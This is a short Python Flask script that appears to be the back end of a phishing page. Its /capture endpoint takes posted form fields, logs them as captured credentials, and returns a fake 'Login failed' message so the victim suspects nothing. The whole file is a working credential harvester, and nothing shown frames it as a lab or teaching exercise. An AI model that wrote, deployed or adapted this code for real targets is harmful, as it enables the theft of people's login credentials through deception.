
from flask import Flask, request

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.form.to_dict()
    print("[+] Credentials Captured:", data)
    return "<h1>Login failed. Try again later.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
